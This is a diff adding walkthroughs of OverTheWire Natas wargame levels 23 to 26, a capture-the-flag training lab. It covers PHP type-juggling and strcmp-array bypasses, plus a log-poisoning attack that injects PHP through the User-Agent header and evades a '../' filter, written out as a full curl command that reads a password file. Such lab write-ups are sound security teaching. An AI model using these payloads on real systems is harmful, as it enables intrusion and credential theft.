@@ -2043,7 +2043,6 @@ Ta-da! We successfully used a single session across two co-located sites.
 
 Mental note: segregate sessions from different sites when hosting on the same server.
 
-
 ## Natas 22 🡆 Natas 23
 
 
@@ -2124,3 +2123,347 @@ Password: [censored]</pre>
 ____
 
 Nice, and easy. What we learned today is that just because you tell a browser to do something, doesn't mean it's going to do it. By ignoring the `Location` header, we were able to snatch the password.
+
+
+## Natas 23 🡆 Natas 24
+
+
+~~~~
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas23</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+~~~~
+
+Another nice, simple challenge. Here it's checking if "iloveyou" exists in the password we give it, but at the same time... it's checking if the password is greater than 10? How can something that contains "iloveyou" *also* be greater than 10?
+
+Something's up, let's go look at how PHP treats casting strings to integers.
+
+`var_dump((int)"10");` outputs as you'd expect.. `int(10)`
+
+`var_dump((int)"ten");` outputs `int(0)`, because it couldn't parse an integer.
+
+What if we have numbers mixed with letters in our string?
+
+`var_dump((int)"ten10");` outputs `int(0)`, so it couldn't find anything there...
+
+But `var_dump((int)"10ten");` outputs `int(10)`! The integer is in front of the letters, so it treats that as the value.
+
+Alright, intersting... By that logic, we could do something like `11iloveyou` for the challenge. "iloveyou" still exists in the password, so that satisfies the first argument, and the leading "11" should satisfy the second argument by being greater than 10.
+
+Let's see if it takes it.
+
+___
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<br>The credentials for the next level are:<br><pre>Username: natas24 Password: [censored]</pre>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+___
+
+Ha! Success!
+
+
+## Natas 24 🡆 Natas 25
+
+
+~~~~
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas24</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+~~~~
+
+Same deal as the last challenge, but with different rules for the password.
+
+This time we've got a simple `strcmp`. How are we going to get around this without knowing exactly what the pasword is?
+
+Let's take a look at `strcmp`'s documentation, maybe we can find something of use.
+
+Oh, look! Here's something:
+
+In the user-contributed notes, someone wrote:
+
+~~~~
+If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.
+For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.
+
+...
+
+strcmp("foo", array()) => NULL + PHP Warning
+~~~~
+
+Interesting! So if we manage to pass this script an array, we'll get `strcmp` to return `NULL`, and since the script is inverting the result, the if statement gets `!NULL`, or `true`. That should give us our password!
+
+But now the question is, how do we get an array into `$_REQUEST["passwd"]`? Luckily, these developers *still* haven't heard of sanitizing inputs, we could do something like: `http://natas24.natas.labs.overthewire.org/?passwd[]`. That should make `$_REQUEST["passwd"]` an empty array, and trigger our `!NULL` `strcmp` result.
+
+Let's see if it works:
+
+___
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<br />
+<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
+<br>The credentials for the next level are:<br><pre>Username: natas25 Password: [censored]</pre>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+___
+
+Ha! There's that warning, telling us it's an array, and there's our credentials. We didn't even have to figure out the password to the challenge itself!
+
+
+## Natas 25 🡆 Natas 26
+
+
+~~~~
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
+<body>
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en"); 
+    }
+    
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+    
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+        
+        closedir($handle);
+        return $listoffiles;
+    } 
+    
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
+</select>
+</form>
+</div>
+
+<?php  
+    session_start();
+    setLanguage();
+    
+    echo "<h2>$__GREETING</h2>";
+    echo "<p align=\"justify\">$__MSG";
+    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
+?>
+<p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+~~~~
+
+This is a bit more complicated... slightly owing to the fact that our only input is a language selection dropdown menu. But... I do see some file read/write operations going on, so it appears there is some serious potential for reading our password directory here. Oh no, wait! 
+
+~~~~
+// dont let ppl steal our passwords
+if(strstr($filename,"natas_webpass")){
+    logRequest("Illegal file access detected! Aborting!");
+    exit(-1);
+}
+~~~~
+
+They thought of that. We have to get very clever if we want to beat this...
+
+What else do we have control over...
+
+~~~~
+function logRequest($message){
+    $log="[". date("d.m.Y H::i:s",time()) ."]";
+    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+    $log=$log . " \"" . $message ."\"\n"; 
+    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+    fwrite($fd,$log);
+    fclose($fd);
+}
+~~~~
+
+Hehehe... I spy an unfiltered `$_SERVER['HTTP_USER_AGENT'];`! We can put whatever we want in that header. But what would allow us to use this function as an attack vector?
+
+Well, let's keep in mind our end goal: We want to read the `/etc/natas_webpass/natas26` file.
+
+Now, let's keep in mind our limitation: We can't read `natas_webpass` from this script.
+
+Hm... crazy idea, but what if we make a new script that can? It's writing whatever we give it for our User Agent header to a file, so we could throw some PHP in there for it to run, like `<?php include "/etc/natas_webpass/natas26"; ?>` But then, the question of "how to run it" arises...
+
+There is an `include` statement up towards the middle, but that's behind the `safeinclude` function which prevents directory traversal.
+
+We're stuck!
+
+Wait wait wait... I just noticed something: they're replacing `../` with nothing... so what would happen if we applied that to a string like `.../...//`? Here's what it would remove: `.[../].[../]/`, leaving us with `../`
+
+Haha! We *can* get past the directory traversal prevention! We just use `.../...//` instead of just `../`
+
+Alright, I think we've got everything to carry out an attack. Let's get `<?php include "/etc/natas_webpass/natas26"; ?>` written to a log file, and set that log file to the `lang` variable so we can include it.
+
+~~~~
+curl --user natas25:[censored] --cookie PHPSESSID=6vitbapso7naujh44uno1t2so6 --header "User-Agent: <?php include '/etc/natas_webpass/natas26'; ?>" "http://natas25.natas.labs.overthewire.org?lang=.../...//.../...//.../...//.../...//.../...//var/www/natas/natas25/logs/natas25_6vitbapso7naujh44uno1t2so6.log"
+~~~~
+
+THAT is one heck of a cURL command. Should work, though. Let's try it.
+
+~~~~
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas25", "pass": [censored] };</script></head>
+<body>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<option>en</option><option>de</option></select>
+</form>
+</div>
+
+[30.12.2018 17::03:33] [censored]
+ "Directory traversal attempt! fixing request."
+<br />
+<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
+<h2></h2><br />
+<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
+<p align="justify"><br />
+<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
+<div align="right"><h6></h6><div><p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+~~~~
+
+Heck yeah! We did it! That was definitely a challenging one. If they had only properly prevented directory traversal, they might've succeeded in foiling attackers.
